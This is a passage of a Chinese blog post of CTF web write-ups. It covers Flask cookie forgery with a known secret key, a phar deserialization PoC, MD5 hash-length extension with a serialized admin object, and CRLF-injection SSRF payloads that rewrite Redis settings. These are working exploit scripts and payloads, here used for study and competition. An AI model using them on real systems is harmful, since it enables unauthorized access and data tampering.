+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y</span><br></pre></td></tr></table></figure>
+
+<p>伪造cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'</span></span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    print(session_serializer.dumps(<span class="string">"admin"</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"lol"</span></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
+
+<p>python3 运行</p>
+<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>反序列化的一道题</p>
+<p>难度不大，但是有一个地方看错了 被坑了一下</p>
+<p>主要就是利用file_exist触发phar反序列化，</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params=<span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">"/var/www/html/f1ag.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"2.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> __HALT_COMPILER();</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span> . <span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;str = <span class="keyword">array</span>(<span class="string">'str'</span>=&gt;<span class="keyword">new</span> Test());</span><br><span class="line">$o = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$o-&gt;str=$a;</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的一点是，Test类的str是一个数组，但当时没看清，在这里卡了很长时间</p>
+<h2 id="SWPUCTF-2016-Web-blogsys"><a href="#SWPUCTF-2016-Web-blogsys" class="headerlink" title="[SWPUCTF 2016]Web blogsys"></a>[SWPUCTF 2016]Web blogsys</h2><p>代码审计 </p>
+<p>哈希扩展</p>
+<p><a href="https://github.com/wonderkun/CTF_web/tree/master/web400-3(swpu_ctf)" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/web400-3(swpu_ctf)</a></p>
+<p><strong>利用过程</strong></p>
+<p>先利用hash扩展伪造管理员删除userid 再利用变量覆盖 union联合查询flag</p>
+<p>riji.php里 $id这里 没有双引号，可能有sql注入，但是前面被intval了，注意一下intval的条件，当result[userid]为真才行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'user'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">    @mysql_conn();</span><br><span class="line">    $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">    mysql_close();</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">        $id = intval($result[<span class="string">'userid'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    </span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            @mysql_conn();</span><br><span class="line">            $sql1 = <span class="string">"select * from msg where userid= $id order by id"</span>;</span><br><span class="line">            $query = mysql_query($sql1);</span><br><span class="line">            $result1 = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class="line">                $result1[] = $temp;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close();</span><br><span class="line">            <span class="keyword">foreach</span> ($result1 <span class="keyword">as</span> $x =&gt; $o) &#123;</span><br><span class="line">                <span class="keyword">echo</span> display($o[<span class="string">'msg'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在api.php里看到 可以删除userid 或者 msg 但是有这么几个条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check === md5($result[<span class="string">'salt'</span>] . <span class="keyword">$this</span>-&gt;data . $username)) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>和hash扩展很像，看一下$username和$this-&gt;data是否可控，</p>
+<p>$username会经过一步转义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username = addslashes(<span class="keyword">$this</span>-&gt;name);<span class="comment">//进入数据库的数据进行转义</span></span><br></pre></td></tr></table></figure>
+
+<p>$this-&gt;data类的一个属性，可控   在api.php的最下面有一行反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = unserialize(base64_decode($api));</span><br><span class="line">$a-&gt;do_method();</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个$api变量  看看是从哪里来的，全局搜索了一下，竟然没找到，</p>
+<p>可能这个变量是在程序的运行中动态生成的，再去找找有没有生成变量的地方，</p>
+<p>api.php文件包含了一个common.php文件，去看看common.php</p>
+<p>这里有一段代码动态生成了变量  而且这个动态生成变量，很明显有变量覆盖的问题$$  并且common.php被多个php文件包含</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">Array</span>(<span class="string">"_POST"</span>, <span class="string">"_GET"</span>, <span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $k[<span class="number">0</span>] != <span class="string">'_'</span> ? $$k = addslashes($v) : $$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的转义addslashes并不影响变量的生成，因为变量的内容经过了一次base64编码</p>
+<p>这三个变量现在剩下 一个salt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result[&apos;salt&apos;] . $this-&gt;data . $username</span><br></pre></td></tr></table></figure>
+
+<p>哈希生成脚本  不需要知道原始的result[salt]  只需要知道他的md5值 就可以，因为hash扩展攻击 就是利用前一轮的md5值，来hash后一组 得到最终的hash值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 md5pad.py   6122c04e8a1f3529d556199960ef2556  admin 16</span><br></pre></td></tr></table></figure>
+
+<p>序列化脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">var</span> $check=<span class="string">'6122c04e8a1f3529d556199960ef2556'</span>;</span><br><span class="line">    <span class="keyword">var</span> $data=<span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">'del_user'</span>;</span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">'4'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin(); </span><br><span class="line">$api = base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br></pre></td></tr></table></figure>
+
+<p>注意$data要用双引号，不能用单引号，单引号不会解析，这里的\x00 需要被解析成空字符</p>
+<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>只看到了hash扩展哪里的问题，做题的时候就在想，我伪造成了admin，有啥用 下面只有删除的东西，和flag毫无关系，最后看了wp才知道，原来前面还有一处sql注入+变量覆盖  </p>
+<p>还有一个地方就是\x80\x00这一串pading，在这里卡了好长时间，先这种的16进制数据得加上双引号才能被解析</p>
+<h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>python urllib 右侧注入</p>
+<p>redis ssrf</p>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(self,url=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        file=open(<span class="string">"index.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">"url"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">"错误"</span>+str(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,password=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">""</span></span><br><span class="line">        file=open(<span class="string">"login.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            re=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">"password"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">"admin"</span>)==password:</span><br><span class="line">                re=open(<span class="string">"flag"</span>,<span class="string">'r'</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">"Can't find admin:"</span>+password+<span class="string">",fast fast fast....."</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">'server.socket_host'</span>: <span class="string">'0.0.0.0'</span>,</span><br><span class="line">                        <span class="string">'server.socket_port'</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">'/'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在input界面发现可以提交url  这里可能是内网环境，不能访问百度，试了一下127.0.0.1不行</p>
+<p>加上8080端口就行了 应该是有ssrf  探测一下端口6379开放  很明显的redis服务</p>
+<p>在login页面貌似是一个需要密码登陆的东西</p>
+<p>利用python的http头部注入 类似于CRLF的一个东西</p>
+<p><a href="https://www.tuicool.com/articles/2iIj2eR" target="_blank" rel="noopener">https://www.tuicool.com/articles/2iIj2eR</a></p>
+<p>看下payload</p>
+<p>一步的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/</span><br></pre></td></tr></table></figure>
+
+<p>分步实现的</p>
+<p>改数据库存储位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/</span><br></pre></td></tr></table></figure>
+
+<p>改admin的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/</span><br></pre></td></tr></table></figure>
+
+<p>这里有一点没有看明白，为什么这些redis命令要加在ip地址和端口之间</p>
+<p>个人推测： 先对整个url访问 这时候端口被解析了，然后在解析url编码的时候，导致了换行注入</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/23/Linux目录/" rel="next" title="Linux目录">
+                <i class="fa fa-chevron-left"></i> Linux目录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/02/从一道ctf学习http请求走私/" rel="prev" title="从一道ctf学习http请求走私">
+                从一道ctf学习http请求走私 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
+          <p class="site-author-name" itemprop="name">John Doe</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-华东南-web11"><span class="nav-number">1.</span> <span class="nav-text">ciscn 华东南 web11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取版本号"><span class="nav-number">1.1.</span> <span class="nav-text">获取版本号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#针对本题的payload"><span class="nav-number">1.2.</span> <span class="nav-text">针对本题的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他的几种payload"><span class="nav-number">1.3.</span> <span class="nav-text">其他的几种payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php标签"><span class="nav-number">1.3.1.</span> <span class="nav-text">php标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#literal-标签"><span class="nav-number">1.3.2.</span> <span class="nav-text">literal 标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#静态方法"><span class="nav-number">1.3.3.</span> <span class="nav-text">静态方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#assgin"><span class="nav-number">1.3.4.</span> <span class="nav-text">assgin</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-华东南-web4"><span class="nav-number">2.</span> <span class="nav-text">ciscn 华东南 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Double-Secret"><span class="nav-number">3.</span> <span class="nav-text">[CISCN2019 华东南赛区]Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FBCTF2019-RCEService"><span class="nav-number">4.</span> <span class="nav-text">[FBCTF2019]RCEService</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FBCTF2019-Event"><span class="nav-number">5.</span> <span class="nav-text">[FBCTF2019]Event</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2018-SimplePHP"><span class="nav-number">6.</span> <span class="nav-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2016-Web-blogsys"><span class="nav-number">7.</span> <span class="nav-text">[SWPUCTF 2016]Web blogsys</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反思"><span class="nav-number">7.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2016-Web7"><span class="nav-number">8.</span> <span class="nav-text">[SWPUCTF 2016]Web7</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
